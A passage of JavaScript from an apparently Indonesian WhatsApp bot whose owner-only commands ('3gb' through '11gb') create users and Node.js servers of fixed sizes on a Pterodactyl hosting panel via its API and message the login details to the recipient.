								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '3gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 3gb"
				let egg = eggsnya
				let loc = location
				let memo = "3200"
				let cpu = "70"
				let disk = "3200"
				let email = username + "3gb@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '4gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 4gb"
				let egg = eggsnya
				let loc = location
				let memo = "4200"
				let cpu = "90"
				let disk = "4200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '5gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 5gb"
				let egg = eggsnya
				let loc = location
				let memo = "5200"
				let cpu = "110"
				let disk = "5200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '6gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 6gb"
				let egg = eggsnya
				let loc = location
				let memo = "6200"
				let cpu = "140"
				let disk = "6200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '7gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 7gb"
				let egg = eggsnya
				let loc = location
				let memo = "7200"
				let cpu = "160"
				let disk = "7200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '8gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 8gb"
				let egg = eggsnya
				let loc = location
				let memo = "8200"
				let cpu = "180"
				let disk = "8200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '9gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 9gb"
				let egg = eggsnya
				let loc = location
				let memo = "9200"
				let cpu = "190"
				let disk = "9200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '10gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 10gb"
				let egg = eggsnya
				let loc = location
				let memo = "10200"
				let cpu = "200"
				let disk = "10200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '11gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 11gb"
				let egg = eggsnya
				let loc = location
				let memo = "11200"
				let cpu = "210"
				let disk = "11200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
